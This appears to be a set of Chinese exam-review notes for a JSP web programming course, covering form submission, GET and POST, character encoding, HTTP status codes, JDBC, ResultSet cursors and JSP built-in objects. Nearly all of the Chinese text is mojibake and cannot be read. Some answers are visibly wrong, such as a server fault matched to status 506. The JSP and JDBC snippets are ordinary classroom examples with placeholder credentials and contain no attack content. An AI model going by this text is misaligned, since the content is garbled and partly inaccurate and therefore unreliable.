D. å•å‡»â€œæäº¤â€æŒ‰é’®ï¼Œè¡¨å•å…ƒç´ ä¸­çš„å†…å®¹ä¼šæäº¤ç»™æœåŠ¡å™¨ç«¯ã€‚ è¡¨å•æ˜¯ä¸€ç§å¯ä»¥ç”±ç”¨æˆ·è¾“å…¥ï¼Œå¹¶æäº¤ç»™æœåŠ¡å™¨ç«¯çš„ä¸€ä¸ªå›¾å½¢ç•Œé¢ æœ‰ä¸‹é¢ä¸¤æ®µä»£ç ï¼š page1.jsp 12345&lt;form action=â€page2.jspâ€&gt;è¯·æ‚¨è¾“å…¥è´¦å·ï¼š&lt;input name=â€accountâ€ type=â€textâ€&gt;&lt;br&gt;è¯·æ‚¨è¾“å…¥å¯†ç ï¼š&lt;input name=â€passwordâ€ type=â€passwordâ€&gt;&lt;br&gt;&lt;input type=â€submitâ€ value=â€ç™»å½•â€&gt;&lt;/form&gt; page2.jsp 12345&lt;%//è·å¾—è¡¨å•ä¸­name=accountçš„è¡¨å•å…ƒç´ ä¸­è¾“å…¥çš„å€¼ï¼Œèµ‹å€¼ç»™strString str1=request.getParameter(â€œaccountâ€);String str2=request.getParameter(â€œzhanghuâ€);%&gt; è‹¥ä¸è¾“å…¥æ•°æ®ï¼Œç›´æ¥å•å‡»â€œç™»å½•â€æŒ‰é’®ï¼Œåˆ™str1å’Œstr2çš„å€¼åˆ†åˆ«æ˜¯ â€â€ã€null åœ¨æµè§ˆå™¨çš„åœ°å€æ ä¸Šçš„URLä¸­éšè—ä¼ è¾“çš„å‚æ•°ï¼Œéœ€è¦å°†æ ‡ç­¾çš„methodå±æ€§å€¼è®¾ç½®ä¸ºpost ä¸‹åˆ—è¯´æ³•ä¸­é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. åœ¨æäº¤è¡¨å•æ•°æ®æ—¶åªèƒ½ç”¨postæ–¹æ³•ã€‚ âŒ B. ä»¥æ–‡æœ¬æ¡†åœ¨æºä»£ç ä¸­å‡ºç°çš„é¡ºåº ä»æ•°ç»„çš„ç¬¬0ä½å¼€å§‹å‘åæ”¾ç½®åŒåè¡¨å•å…ƒç´ çš„æ•°æ®ã€‚ C. é™¤äº†å¤é€‰æ¡†ã€å¤šé€‰åˆ—è¡¨æ¡†ç­‰ï¼Œå…¶ä»–ä¸€äº›è¡¨å•å…ƒç´ ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºåŒåã€‚ D. è·å–åŒåè¡¨å•å…ƒç´ ä¸­æ•°æ®çš„æ–¹æ³•ä¸ºrequest.getParameterValue(arg)ã€‚ ****åœ¨æäº¤è¡¨å•æ•°æ®æ—¶å¯ä»¥ç”¨ getã€post ä¸‹åˆ—è¡¨å•ä¸­ä¸æ˜¯å•ä¸€è¡¨å•å…ƒç´ çš„æ˜¯ï¼ˆï¼‰ã€‚ A. å¯†ç æ¡† B. å¤é€‰æ¡† âœ… C. æ–‡æœ¬æ¡† D. å•é€‰æŒ‰é’® åœ¨è¡¨å•æäº¤çš„è¿‡ç¨‹ä¸­ï¼Œä¸èƒ½è§£å†³ä¸­æ–‡ä¹±ç é—®é¢˜çš„æ–¹æ¡ˆä¸ºï¼ˆï¼‰ã€‚ A. å°†è·å–åˆ°çš„æ•°æ®è½¬æ¢æˆgb2312çš„æ ¼å¼ã€‚ B. æŠŠæ–‡ä»¶å¤´ä¸Šçš„å­—ç¬¦é›†è®¾ç½®ä¸ºä¸­æ–‡å­—ç¬¦é›†ã€‚ âœ… C. åœ¨è·å–æ•°æ®ä¹‹å‰å…ˆä¿®æ”¹requestçš„ç¼–ç æ–¹å¼ã€‚ D. åˆ©ç”¨è¿‡æ»¤å™¨å¯¹æ•´ä¸ªWebåº”ç”¨è¿›è¡Œç»Ÿä¸€çš„ç¼–ç è¿‡æ»¤ã€‚ è™½ç„¶è¡¨å•ä¼ å€¼çš„æ–¹æ³•ä¸æ˜¯ç»å¯¹å®‰å…¨çš„ï¼Œä½†ç”±äºå…¶ç®€å•æ€§å’Œå¹³å°æ”¯æŒçš„å¤šæ ·æ€§ï¼Œå¾ˆå¤šç¨‹åºè¿˜æ˜¯ç”¨è¡¨å•ä¼ å€¼ã€‚ è¡¨å•å…ƒç´ æ”¾åœ¨æ ‡ç­¾ä¹‹é—´ã€‚ è¡¨å•å…ƒç´ æäº¤ç»™æœåŠ¡å™¨ç«¯çš„å“ªä¸ªé¡µé¢å¯ä»¥ç”¨ä¸­çš„actionå±æ€§å†³å®šã€‚ åœ¨è¡¨å•ä¸­æäº¤è¯·æ±‚çš„ä¸¤ç§å¸¸è§æ–¹å¼æ˜¯getå’Œpostï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯getæ–¹å¼ã€‚ æ†ç»‘è¡¨å•å…ƒç´ æ•°æ®çš„è·å–æ–¹æ³•ä¸ºrequest.getParameterValues()ã€‚ å°†Typeå±æ€§è®¾ç½®ä¸ºhiddenå¯ä»¥éšè—è¡¨å•å…ƒç´ ã€‚ ç›´æ¥ä¿®æ”¹requestçš„ç¼–ç æ–¹å¼æ¥è§£å†³ä¸­æ–‡ä¹±ç é—®é¢˜çš„request.setCharacterEncoding(&quot;UTF-8&quot;) Httpæ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œåœ¨é¡µé¢ä¹‹é—´ä¼ é€’å€¼æ—¶å¿…é¡»é€šè¿‡æœåŠ¡å™¨ã€‚ åœ¨ç”¨JavaScriptå¯¹è¡¨å•çš„è¾“å…¥è¿›è¡ŒéªŒè¯æ—¶ï¼Œéœ€è¦å°†â€œæäº¤â€æŒ‰é’®çš„ç±»å‹è®¾ç½®ä¸ºbuttonã€‚ ç°æœ‰æ–‡ä»¶åä¸ºcharCode.jspæºä»£ç ï¼Œè¯·é—®æ–‡ä»¶è¿è¡Œåèƒ½ä¸èƒ½ä¼ å€¼åˆ°æŒ‡å®šé¡µé¢ï¼Œå¦‚æœä¸èƒ½è¯·æ‰¾å‡ºé”™è¯¯ä»£ç ã€‚ï¼ˆï¼‰ 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form acton=&quot;charCode.jsp&quot;&gt; è¯·æ‚¨è¾“å…¥é²œèŠ±çš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;BR&gt; &lt;input type=&quot;hidden&quot; name=&quot;flower&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;æŸ¥è¯¢&quot;&gt; âŒ &lt;/form&gt;&lt;% String flower = request.getParameter(&quot;flower&quot;);if(flower!=null)&#123; out.println(&quot;èŠ±æœµåç§°ä¸ºï¼š&quot; + flower);&#125;%&gt;&lt;/body&gt;&lt;/html&gt; æœ¬é¡µé¢æ—¢å½“å®¢æˆ·ç«¯æäº¤è¡¨å•é¡µé¢ï¼Œåˆå½“æœåŠ¡å™¨ç«¯æ¥æ”¶è¡¨å•é¡µé¢ è™½ç„¶è¾“å…¥æ¡†è¢«éšè—äº†ï¼Œå®¢æˆ·ç«¯æ— æ³•è¾“å…¥å€¼ï¼Œä½†è¿˜æ˜¯å¯ä»¥ä¼ å€¼åˆ°æ¥æ”¶é¡µé¢ï¼› ç±»å‹ä¸ºæ™®é€šæŒ‰é’®buttonæ˜¯æ— æ³•å‘æ¥æ”¶é¡µé¢æäº¤è¡¨å•ä¿¡æ¯ï¼Œsubmitæ‰èƒ½æäº¤ postæ–¹æ³•æ˜¯å°†è¡¨å•å†…å„å­—æ®µä¸å…¶å†…å®¹ä»¥é”®-å€¼å¯¹æ”¾åœ¨httpæŠ¥æ–‡çš„å“ªä¸ªéƒ¨åˆ†ï¼Ÿï¼ˆï¼‰ httpè¯·æ±‚æŠ¥æ–‡çš„å®ä½“ä¸»ä½“éƒ¨åˆ† Getæ–¹æ³•æ˜¯å°†ä¼ å€¼å†…å®¹ä»¥é”®å€¼å¯¹æ”¾åœ¨httpè¯·æ±‚æŠ¥æ–‡è¯·æ±‚è¡Œçš„URLå­—æ®µ Postæ–¹æ³•æ˜¯å°†ä¼ å€¼å†…å®¹ä»¥é”®å€¼å¯¹æ”¾åœ¨httpè¯·æ±‚æŠ¥æ–‡çš„å®ä½“ä¸»ä½“éƒ¨åˆ† å¦‚æœç°åœ¨å› ä¸ºæœåŠ¡å™¨æ•…éšœè€Œæ— æ³•è¿”å›è¯·æ±‚çš„é¡µé¢ï¼Œè¿”å›çŠ¶æ€ç 506 varlant also negotiates 2xx è¡¨ç¤ºæˆåŠŸ 204 No Content è¡¨ç¤ºæœåŠ¡å™¨æˆåŠŸå¤„ç†è¯·æ±‚ï¼Œä½†ä¸éœ€è¦è¿”å›ä»»ä½•å®ä½“å†…å®¹ 3xx è¡¨ç¤ºé‡å®šå‘ï¼Œå®Œæˆè¯·æ±‚åè¿˜éœ€è¦è¿›ä¸€æ­¥é‡‡å–æªæ–½ã€‚ 304 Not Modified è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªå¸¦æ¡ä»¶çš„GEtè¯·æ±‚ï¼Œæ–‡æ¡£å†…å®¹æ²¡è¢«æ”¹å˜ 4xx è¡¨ç¤ºå®¢æˆ·çš„å·®é”™ 5xx è¡¨ç¤ºæœåŠ¡å™¨çš„å·®é”™ UTF-8 ä¸­æ–‡å­—ç¬¦ä½¿ç”¨24ä½ç¼–ç ï¼Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨8ä½ç¼–ç ï¼Œå…¼å®¹ASCIIå’ŒISO-8859-1ã€‚ä¸å…¼å®¹ä¸­æ–‡å­—ç¬¦ä½¿ç”¨16ä½ç¼–ç çš„GB232&#x2F;GBKã€‚ Unicode ä¸­æ–‡å­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨16ä½æˆ–32ä½ç¼–ç ï¼Œä¸å…¼å®¹GBK GB2312 ä¸­æ–‡å­—ç¬¦ä½¿ç”¨16ä½ç¼–ç ï¼Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨8ä½ç¼–ç ï¼Œå…¼å®¹ISO-8859-1 ISO-8859-1 ä½¿ç”¨8ä½ç¼–ç ï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡å­—ç¬¦ï¼Œå…¼å®¹ASCII ç°æœ‰tomcatæœåŠ¡å™¨é…ç½®æ–‡ä»¶server.xmléƒ¨åˆ†å†…å®¹ï¼ŒåŠå®¢æˆ·ç«¯æäº¤è¡¨å•é¡µé¢a.jspï¼Œå’ŒæœåŠ¡å™¨ç«¯è¡¨å•æ¥æ”¶é¡µé¢b.jspï¼Œå®¢æˆ·æäº¤è¡¨å•åä¸­æ–‡æ˜¾ç¤ºä¹±ç ï¼Œè¯·ç”¨ä»¥ä¸‹å“ªç§åŠæ³•å¯ä»¥æ­£ç¡®æ˜¾ç¤ºä¸­æ–‡å­—ç¬¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445Server.xml&lt;Connector connectionTimeout=&quot;20000&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; redirectPort=&quot;8443&quot; URIEncoding=&quot;gbk&quot;/&gt;a.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot; method=&quot;get&quot;&gt; è¯·æ‚¨è¾“å…¥å­¦ç”Ÿçš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;BR&gt; &lt;input name=&quot;stuname&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;b.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;% String stuname = request.getParameter(&quot;stuname&quot;); out.println(&quot;è¾“å…¥çš„æŸ¥è¯¢å…³é”®å­—ä¸º:&quot; + stuname); %&gt; &lt;/body&gt;&lt;/html&gt; æ”¹a.jspé‡Œä»£ç charset=gb2312; æ”¹b.jspé‡Œçš„ä»£ç  charset=utf-8 postæ–¹æ³•ä¼ å€¼é”®-å€¼å¯¹åœ¨è¯·æ±‚æŠ¥æ–‡å®ä½“ä¸»ä½“éƒ¨åˆ†ï¼Œé»˜è®¤ç”¨iso-8859-1ç¼–ç ï¼Œå¯ä»¥åœ¨æ¥æ”¶é¡µé¢è½¬ç äº¤ç»™æœåŠ¡å™¨ã€‚ getæ–¹æ³•ä¼ å€¼é”®-å€¼å¯¹åœ¨è¯·æ±‚æŠ¥æ–‡è¯·æ±‚è¡Œçš„URLå­—æ®µï¼Œé»˜è®¤ç”¨iso-8859-1ç¼–ç ï¼Œéœ€è¦åœ¨å®¢æˆ·æäº¤é¡µé¢è½¬ç äº¤ç»™æœåŠ¡å™¨ ç¬¬å…­ç«  JSPè®¿é—®æ•°æ®åº“ ä¸‹åˆ—å…³äºJDBCæŠ€æœ¯çš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. JDBCç›¸å…³çš„APIå­˜æ”¾åœ¨java.sqlåŒ…ä¸­ã€‚ B. JDBCå¯ä»¥é€‚ç”¨äºä»»ä½•è¯­è¨€ã€‚ âŒ C. JDBCæä¾›äº†ä¸€ç³»åˆ—çš„APIï¼Œè®©Javaè¯­è¨€ç¼–å†™çš„ä»£ç è¿æ¥æ•°æ®åº“ï¼Œå¯¹æ•°æ®åº“çš„æ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹å’ŒæŸ¥è¯¢ã€‚ D. åœ¨JavaæŠ€æœ¯ç³»åˆ—ä¸­ï¼Œè®¿é—®æ•°æ®åº“çš„æŠ€æœ¯å«åšJDBCã€‚ JDBCåªèƒ½é€‚ç”¨äºJAVA java.sql.Connectionè´Ÿè´£ è¿æ¥æ•°æ®åº“ java.sql.Statement è´Ÿè´£æ‰§è¡Œæ•°æ®åº“SQLè¯­å¥ã€‚ java.sql.ResultSet :è´Ÿè´£å­˜æ”¾æŸ¥è¯¢ç»“æœã€‚ DriverManager.getConnection(â€œURLâ€ï¼Œâ€ç”¨æˆ·åâ€ï¼Œâ€œå¯†ç â€)çš„åŠŸèƒ½æ˜¯è·å–æ•°æ®åº“è¿æ¥ ä¸‹åˆ—å…³äºResultSetç±»çš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. æ¸¸æ ‡æ˜¯åœ¨ResultSetä¸­çš„ä¸€ä¸ªå¯ä»¥ç§»åŠ¨çš„æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘ä¸€è¡Œæ•°æ®ï¼Œåˆå§‹æ—¶æŒ‡å‘ç¬¬ä¸€è¡Œçš„å‰ä¸€è¡Œã€‚ B. ä»ResultSetçš„æŸä¸€è¡Œä¸­é€šè¿‡getXXX()æ–¹æ³•å–æ•°æ®çš„æ¯ä¸€åˆ—èƒ½å–æ— é™æ¬¡ã€‚ âŒ C. å½“æ¸¸æ ‡æŒ‡å‘æŸä¸€è¡Œæ—¶å¯ä»¥é€šè¿‡ResultSetçš„getXXX(â€œåˆ—åâ€)æ–¹æ³•å¾—åˆ°è¿™ä¸€è¡Œçš„æŸä¸ªæ•°æ®ã€‚ D. ResultSetçš„next()æ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„æ•°æ® ä»æŸä¸€è¡Œä¸­é€šè¿‡ getXXX() æ–¹æ³•å–æ•°æ®æ¯ä¸€åˆ—åªèƒ½å–ä¸€æ¬¡ åœ¨Connectionä¸­è®¾ç½®executeUpdate()ä¸è‡ªåŠ¨æäº¤çš„ä»£ç æ˜¯connection.setAutoCommit(false) ä¸‹åˆ—å…³äºå‚å•†é©±åŠ¨çš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. é©±åŠ¨ç¨‹åºä¸€èˆ¬å¼¹æ€§è¾ƒå·®ï¼Œå¾€å¾€åªé€‚ç”¨äºè‡ªå·±çš„æ•°æ®åº“ç³»ç»Ÿã€‚ B. ä½¿ç”¨å‚å•†é©±åŠ¨çš„æ–¹æ³•å®Œå…¨ä¸ä¾èµ–äºODBCï¼Œä½†æ˜¯åªèƒ½åœ¨Windowsæ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨ã€‚ âŒ C. ä¸åŒé©±åŠ¨ç¨‹åºå’Œä¸åŒæ•°æ®åº“å¯ä»¥é‡‡ç”¨ä¸åŒé©±åŠ¨ç¨‹åºåç§°å’ŒURLã€‚ D. ä½¿ç”¨å‚å•†é©±åŠ¨éœ€è¦ä¸‹è½½ç›¸åº”çš„å‚å•†é©±åŠ¨åŒ…ï¼Œå°†å…¶å¤åˆ¶åˆ°Webé¡¹ç›®çš„â€œWEB-INF&#x2F;libâ€ä¸‹ã€‚ è¿æ¥åˆ°æœ¬æœºMySQLæ•°æ®åº“ä¸Šçš„SCHOOLæ•°æ®åº“çš„ä»£ç ä¸ºï¼ˆï¼‰ï¼Œå…¶ç”¨æˆ·åä¸ºâ€rootâ€ï¼Œå¯†ç ä¸ºâ€œmanagerâ€ã€‚ 1Connection conn=DriverManager.getConnection(â€œjdbc:mysql://localhost:3306/SCHOOLâ€,â€rootâ€,â€managerâ€); MySQLçš„é»˜è®¤æ•°æ®åº“ç«¯å£ä¸º3306 mssqlçš„é»˜è®¤ç«¯å£æ˜¯1433 ä¸€ä¸ªå…¸å‹çš„JDBCæŒ‰ç…§ï¼ˆï¼‰é¡ºåºç¼–å†™ã€‚ æŒ‡å®šé©±åŠ¨ 2. è·å¾—ä¸æ•°æ®çš„è¿æ¥ 3. ä½¿ç”¨statementæ¥å£è¿è¡ŒSQLè¯­å¥ 4. å¤„ç†SQLè¯­å¥çš„è¿è¡Œç»“æœ 5. å…³é—­æ•°æ®åº“è¿æ¥ ä¸‹åˆ—å…³äºJDBC-ODBCæ¡¥çš„è¯´æ³•ä¸­é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. ODBCæ¡¥æ¥æ¯”è¾ƒç®€å•ï¼Œæ”¯æŒæ‰€æœ‰æ“ä½œç³»ç»Ÿä¸Šçš„æ•°æ®åº“è¿æ¥ã€‚ âŒ B. ç”±ODBCè¿æ¥åˆ°ç‰¹å®šçš„æ•°æ®åº“ä¹‹åï¼ŒJDBCåªéœ€è¦è¿æ¥åˆ°ODBCå°±å¯ä»¥äº†ã€‚ C. ODBCå‡ ä¹å¯ä»¥æ”¯æŒåœ¨Windowså¹³å°ä¸‹è¿è¡Œçš„æ‰€æœ‰æ•°æ®åº“ã€‚ D. é€šè¿‡ODBCå°±å¯ä»¥è¿æ¥åˆ°ODBCæ”¯æŒçš„ä»»æ„ä¸€ç§æ•°æ®åº“ ODBCåªèƒ½åœ¨Windowsä¸‹ åœ¨java.sqlåŒ…ä¸­è´Ÿè´£æ‰§è¡Œæ•°æ®åº“SQLè¯­å¥çš„ç±»æ˜¯java.sql.Statement æ•°æ®åº“è¿æ¥æœ‰ä¸¤ç§æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯æ•°æ®åº“å‚å•†é©±åŠ¨è¿æ¥å’ŒJDBC-ODBCæ¡¥æ¥æ–¹å¼ã€‚ ODBCï¼šOpen Database Connectivity å¼€æ”¾æ•°æ®åº“äº’è¿ JDBCï¼šJava Database Connectivity Javaæ•°æ®åº“è¿æ¥ åŠ è½½æ•°æ®åº“é©±åŠ¨ç±»çš„ä»£ç æ˜¯Class.forName(&quot;é©±åŠ¨å&quot;) statment.excuteUpdate(sql)ä¸»è¦ç”¨æ¥æ‰§è¡Œæ·»åŠ æ•°æ®ã€åˆ é™¤æ•°æ®ã€ä¿®æ”¹æ•°æ®çš„SQLè¯­å¥ï¼Œå…¶è¿”å›å€¼ä»£è¡¨çš„æ˜¯è¿™æ¡sqlè¯­å¥æ‰§è¡Œå—å½±å“çš„è¡Œæ•° statement.executeQuery(sql)ä¸»è¦ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢æ•°æ®çš„SQLè¯­å¥ï¼Œå®ƒçš„è¿”å›å€¼æ˜¯ResultSetç±»å‹ï¼Œç”¨äºå­˜æ”¾SQLè¯­å¥æ‰§è¡Œåè¿”å›çš„ç»“æœã€‚ PreparedStatmentçš„setString(n,å‚æ•°)æ–¹æ³•å¯ä»¥å°†ç¬¬nä¸ªâ€œï¼Ÿâ€ä¼ é€’çš„å‚æ•°ä»£æ›¿ã€‚ å¯ä»¥ä½¿ç”¨Connectionç±»æ¥å®šä¹‰executeUpdate()æ–¹æ³•æ˜¯å¦è‡ªåŠ¨æäº¤SQLè¯­å¥çš„ç»“æœï¼Œå¹¶è¿›è¡Œäº‹åŠ¡çš„æäº¤æˆ–å›æ»šã€‚ é€šè¿‡ODBCå¯ä»¥è¿æ¥åˆ°ODBCæ”¯æŒçš„ä»»æ„ä¸€ç§æ•°æ®åº“ï¼Œè¿™ç§è¿æ¥æ–¹å¼å«åšJDBC-ODBCæ¡¥ å¦‚æœè¿œç¨‹MySQLæ•°æ®åº“æœåŠ¡å™¨çš„IPåœ°å€æ˜¯202.115.128.123ï¼Œè¿›å…¥æ­¤æœåŠ¡å™¨MySQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯ç®¡ç†å·¥å…·çš„å‘½ä»¤ä¸ºï¼ˆï¼‰ã€‚ 1mysql -h 202.115.128.123 root -p æŸ¥è¯¢ç»“æœé›†ResultSetæ˜¯ä»¥ç»Ÿä¸€çš„è¡Œåˆ—å½¢å¼ç»„ç»‡æ•°æ®ï¼Œæ‰§è¡Œâ€œResultSet rs=stat.executeQuery(â€œselect bid,name,author,publish,price from bookâ€);â€è¯­å¥ï¼Œå¾—åˆ°çš„ç»“æœé›†rsçš„åˆ—æ•°ä¸ºï¼ˆï¼‰ã€‚ 5 å‘æ•°æ®åº“æ·»åŠ æ•°æ®ï¼Œå¯ä»¥è·å¾—æˆåŠŸæ·»åŠ æ¡æ•°çš„æ–¹æ³•æ˜¯ï¼ˆï¼‰ã€‚ A. executeUpdate() âœ… B. getString() C. createStatement() D. executeQuery() executeQuery() å‘é€æŸ¥è¯¢SQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†ã€‚ createStatement() ä¸æ•°æ®åº“å»ºç«‹è¿æ¥ï¼Œæ‰“å¼€æ•°æ®åº“ã€‚ executeUpdate() è¿”å›ä¸€ä¸ªæ•´å‹ï¼Œæ„æ€ä¸ºè¿™æ¡sqlè¯­å¥æ‰§è¡Œå—å½±å“çš„è¡Œæ•°ï¼Œå³æˆåŠŸæ·»åŠ çš„æ¡æ•°ã€‚ åœ¨æ¸¸æ ‡çš„æ§åˆ¶ä¸­ï¼Œä»¥ä¸‹éƒ¨åˆ†ä»£ç èƒ½å®ç°å€’åºå¥‡æ•°è¡Œè®°å½•è¾“å‡ºçš„æ˜¯ï¼ˆï¼‰ã€‚ C. âœ… 123456rs.afterLast();while(rs.previous())&#123; int i=rs.getRow(); if(i%2&lt;&gt;0)&#123;â€¦â€¦&#125;â€¦â€¦&#125; rs.afterLast() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„æœ€åä¸€è¡Œä¹‹åã€‚ rs.last() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„æœ€åä¸€è¡Œã€‚ rs.befortFirst() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„ç¬¬ä¸€è¡Œä¹‹å‰ã€‚ if(i%2==0) åˆ¤æ–­æ˜¯å¦ä¸ºå¶æ•°ã€‚ if(i%2==1) åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°ã€‚ if(i%2&lt;&gt;0) åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°ã€‚ å…³äºè¿æ¥æ± çš„ä½¿ç”¨ï¼Œä¸‹é¢æè¿°æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ åœ¨è¿æ¥æ± é›†åˆä¸­åˆ›å»ºè¿æ¥å¯¹è±¡å¯ä»¥ä½¿ç”¨add()æ–¹æ³• è®¾å®šè¿æ¥æ± æœ€å¤§è¿æ¥æ•°å¯ä»¥é˜²æ­¢ç”¨æˆ·æ— é™åˆ¶åœ°ä¸æ•°æ®åº“è¿æ¥ã€‚ ä½¿ç”¨å®Œè¿æ¥å¯¹è±¡æ”¾å›è¿æ¥æ± æ•°ç»„ add() ä»è¿æ¥æ± æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªè¿æ¥å¯¹è±¡remove() ç¬¬ä¸ƒç«  JSPå†…ç½®å¯¹è±¡(1) ä¸‹åˆ—å…³äºå†…ç½®å¯¹è±¡çš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. åœ¨æ‰€æœ‰çš„JSPé¡µé¢ä¸­ï¼Œç›´æ¥è°ƒç”¨å†…ç½®å¯¹è±¡éƒ½æ˜¯åˆæ³•çš„ã€‚ B. å†…ç½®å¯¹è±¡æ˜¯è‡ªåŠ¨è½½å…¥çš„ï¼Œå› æ­¤ä¸éœ€è¦ç›´æ¥å®ä¾‹åŒ–ã€‚ C. åœ¨JSPè§„èŒƒä¸­å®šä¹‰äº†4ç§å†…ç½®å¯¹è±¡ã€‚ âŒ D. å†…ç½®å¯¹è±¡æ˜¯é€šè¿‡Webå®¹å™¨æ¥å®ç°å’Œç®¡ç†çš„ã€‚ JSP è§„èŒƒä¸­å®šä¹‰äº†ä¹ç§å†…ç½®å¯¹è±¡ï¼Œ out ç®¡ç†å¯¹å®¢æˆ·ç«¯çš„è¾“å‡º request å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ response å‘å®¢æˆ·ç«¯å‘å‡ºå“åº” session ä¿å­˜åŒä¸€å®¢æˆ·ç«¯ä¸€æ¬¡ä¼šè¯è¿‡ç¨‹ä¸­çš„ä¸€äº›ä¿¡æ¯ application è¡¨ç¤ºæ•´ä¸ªåº”ç”¨çš„ç¯å¢ƒçš„ä¿¡æ¯ exception è¡¨ç¤ºé¡µé¢ä¸Šå‘ç”Ÿçš„å¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡å®ƒè·å¾—é¡µé¢å¼‚å¸¸ä¿¡æ¯ page è¡¨ç¤ºçš„æ˜¯å½“å‰ JSP é¡µé¢æœ¬èº«ï¼Œå°±åƒJava ç±»å®šä¹‰ä¸­çš„ this ä¸€æ · pageContext å¯¹è±¡:è¡¨ç¤ºçš„æ˜¯æ­¤ JSP çš„ä¸Šä¸‹æ–‡ config å¯¹è±¡:è¡¨ç¤ºæ­¤ JSP çš„ ServletConfig ä¸‹åˆ—å†…ç½®å¯¹è±¡ä¸­ exception ç”¨æ¥è¡¨ç¤ºé¡µé¢ä¸Šå‘ç”Ÿå¼‚å¸¸ã€‚ outå¯¹è±¡ç®¡ç†ç¼“å†²åŒºæ–¹æ³•ä¸­ï¼Œæ¸…é™¤ç¼“å†²åŒºé‡Œçš„æ•°æ®ä½†ä¸æŠŠæ•°æ®å†™å…¥å®¢æˆ·ç«¯çš„æ˜¯ ****void clear() åœ¨requestå¯¹è±¡çš„æ–¹æ³•ä¸­ï¼Œç”¨æ¥å¾—åˆ°è¯·æ±‚çš„URLåœ°å€çš„æ–¹æ³•æ˜¯request.getRequestURL() ä¸‹åˆ—å…³äºjsp:forwardå’Œresponseçš„sendRedirectæ–¹æ³•è¿›è¡Œé‡å®šå‘çš„è¯´æ³•ä¸­é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. forwardæ–¹æ³•åªèƒ½åœ¨åŒä¸€ä¸ªWebåº”ç”¨ç¨‹åºå†…çš„èµ„æºä¹‹é—´è½¬å‘è¯·æ±‚ã€‚ B. ä¸redirectæ–¹æ³•ç›¸æ¯”ï¼Œforwardæ–¹æ³•çš„æ•ˆç‡è¾ƒé«˜ã€‚ C. forwardæ–¹æ³•å±äºæœåŠ¡å™¨ç«¯å»è¯·æ±‚èµ„æºï¼Œè€Œredirectæ–¹æ³•è®©å®¢æˆ·ç«¯é‡æ–°å‘æœåŠ¡å™¨ç«¯è¯·æ±‚ä¸€éã€‚ D. forwardè½¬å‘çš„é¡µä»¥åŠè½¬å‘åˆ°çš„ç›®æ ‡é¡µé¢ä¸èƒ½å…±äº«requesté‡Œé¢çš„æ•°æ®ï¼Œä½†redirectæ–¹æ³•å¯ä»¥ã€‚ âŒ forward æ–¹æ³•å±äºæœåŠ¡å™¨ç«¯å»è¯·æ±‚èµ„æºï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨çš„åœ°å€ä¸å˜ redirect å®¢æˆ·ç«¯é‡æ–°è¯·æ±‚ä¸€ éï¼Œæ‰€ä»¥åœ°å€æ˜¾ç¤ºæ ä¼šå˜ ä»æ•°æ®å…±äº«æ¥çœ‹ forward è½¬å‘çš„é¡µé¢ï¼Œä»¥åŠè½¬å‘åˆ°çš„ç›®æ ‡é¡µé¢èƒ½å¤Ÿå…±äº« request é‡Œé¢çš„æ•°æ®ã€‚ redirect è½¬å‘çš„é¡µé¢ä»¥åŠè½¬å‘åˆ°çš„ç›®æ ‡é¡µé¢ä¸èƒ½å…±äº« request é‡Œé¢çš„æ•°æ®ã€‚ responseå¯¹åº”çš„ç±»æ˜¯ javax.servlet.http.HttpServletResponse() Cookie.setMaxAge(int second)ç”¨æ¥è®¾ç½®è®¾ç½®Cookieçš„å­˜æ´»æ—¶é—´çš„ä»£ç æ˜¯ï¼ˆï¼‰ã€‚ 